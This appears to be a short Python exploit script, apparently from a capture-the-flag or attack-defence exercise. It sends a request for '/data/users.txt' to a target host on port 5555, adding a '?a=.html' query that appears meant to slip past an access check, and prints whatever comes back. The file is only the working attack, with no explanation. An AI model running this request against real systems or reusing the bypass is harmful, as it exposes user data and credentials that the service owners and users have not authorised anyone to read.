import sys
import requests

URL = 'http://%s:5555' % sys.argv[1]

r = requests.get(URL + '/data/users.txt?a=.html')

print(r.text)
